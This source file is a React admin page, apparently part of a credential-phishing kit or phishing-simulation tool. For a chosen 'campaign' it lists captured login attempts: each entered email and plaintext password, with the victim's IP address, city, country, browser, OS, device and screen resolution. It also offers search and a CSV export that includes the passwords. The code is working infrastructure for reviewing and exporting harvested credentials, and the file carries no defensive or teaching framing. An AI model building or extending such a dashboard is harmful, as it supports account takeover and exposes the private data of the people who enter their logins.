import { useEffect, useState } from "react";
import { useParams, Link } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import AdminLayout from "@/components/AdminLayout";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { ArrowLeft, Download, RefreshCw, Search } from "lucide-react";
import type { Tables } from "@/integrations/supabase/types";

type Attempt = Tables<"login_attempts">;

const CampaignDetail = () => {
  const { user, loading: authLoading } = useAuth();
  const { id } = useParams<{ id: string }>();
  const [attempts, setAttempts] = useState<Attempt[]>([]);
  const [campaignName, setCampaignName] = useState("");
  const [search, setSearch] = useState("");
  const [loading, setLoading] = useState(true);

  const fetchDetail = async () => {
    if (!id || !user) {
      setLoading(false);
      return;
    }

    setLoading(true);

    try {
      // Fetch campaign name
      const { data: campaign } = await supabase
        .from("campaigns")
        .select("name")
        .eq("id", id)
        .maybeSingle();

      if (campaign) setCampaignName(campaign.name);

      // Fetch attempts
      const { data, error } = await supabase
        .from("login_attempts")
        .select("*")
        .eq("campaign_id", id)
        .order("created_at", { ascending: false });

      if (error) console.error("Error fetching detail:", error);
      if (data) setAttempts(data);

    } catch (err) {
      console.error("Critical error in detail fetch:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    // Only run fetch if auth is done loading
    if (!authLoading && user?.id) {
      fetchDetail();
    } else if (!authLoading && !user) {
      setLoading(false);
    }
  }, [id, authLoading, user?.id]);

  const handleRefresh = () => {
    fetchDetail();
  };

  const filtered = attempts.filter(
    (a) =>
      a.entered_email.toLowerCase().includes(search.toLowerCase()) ||
      a.ip_address?.toLowerCase().includes(search.toLowerCase()) ||
      a.city?.toLowerCase().includes(search.toLowerCase()) ||
      a.country?.toLowerCase().includes(search.toLowerCase())
  );

  const exportCSV = () => {
    const headers = ["Timestamp", "Email", "Password", "IP", "City", "Country", "Browser", "OS", "Device", "Resolution"];
    const rows = filtered.map((a) => [
      new Date(a.created_at).toISOString(),
      a.entered_email,
      a.entered_password,
      a.ip_address,
      a.city,
      a.country,
      a.browser,
      a.os,
      a.device_type,
      a.screen_resolution,
    ]);
    const csv = [headers.join(","), ...rows.map((r) => r.map((v) => `"${v || ""}"`).join(","))].join("\n");
    const blob = new Blob([csv], { type: "text/csv" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${campaignName || "campaign"}-attempts.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <AdminLayout>
      <div className="space-y-6">
        <div className="flex items-center gap-4">
          <Button variant="ghost" size="icon" asChild>
            <Link to="/admin"><ArrowLeft className="h-4 w-4" /></Link>
          </Button>
          <div className="flex-1">
            <h1 className="text-2xl font-bold text-foreground">{campaignName || "Campaign"}</h1>
            <p className="text-sm text-muted-foreground">{filtered.length} attempt(s)</p>
          </div>
          <div className="flex gap-2">
            <Button variant="outline" size="sm" onClick={handleRefresh}>
              <RefreshCw className="mr-2 h-4 w-4" /> Refresh
            </Button>
            <Button variant="outline" size="sm" onClick={exportCSV}>
              <Download className="mr-2 h-4 w-4" />CSV Export
            </Button>
          </div>
        </div>

        <div className="relative">
          <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
          <Input
            placeholder="Search by email, IP, location..."
            className="pl-10"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />
        </div>

        {loading ? (
          <div className="flex flex-col items-center justify-center space-y-4 py-8">
            <p className="text-muted-foreground">Loading details...</p>
          </div>
        ) : (
          <div className="rounded-md border">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Timestamp</TableHead>
                  <TableHead>Email</TableHead>
                  <TableHead>Password</TableHead>
                  <TableHead>IP</TableHead>
                  <TableHead>Location</TableHead>
                  <TableHead>Browser</TableHead>
                  <TableHead>OS</TableHead>
                  <TableHead>Device</TableHead>
                  <TableHead>Resolution</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filtered.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={9} className="text-center text-muted-foreground py-8">
                      No attempts recorded yet
                    </TableCell>
                  </TableRow>
                ) : (
                  filtered.map((a) => (
                    <TableRow key={a.id}>
                      <TableCell className="whitespace-nowrap text-xs">{new Date(a.created_at).toLocaleString()}</TableCell>
                      <TableCell className="font-mono text-xs">{a.entered_email}</TableCell>
                      <TableCell className="font-mono text-xs">{a.entered_password}</TableCell>
                      <TableCell className="text-xs">{a.ip_address}</TableCell>
                      <TableCell className="text-xs">{[a.city, a.country].filter(Boolean).join(", ") || "—"}</TableCell>
                      <TableCell className="text-xs">{a.browser}</TableCell>
                      <TableCell className="text-xs">{a.os}</TableCell>
                      <TableCell className="text-xs">{a.device_type}</TableCell>
                      <TableCell className="text-xs">{a.screen_resolution}</TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        )}
      </div>
    </AdminLayout>
  );
};

export default CampaignDetail;
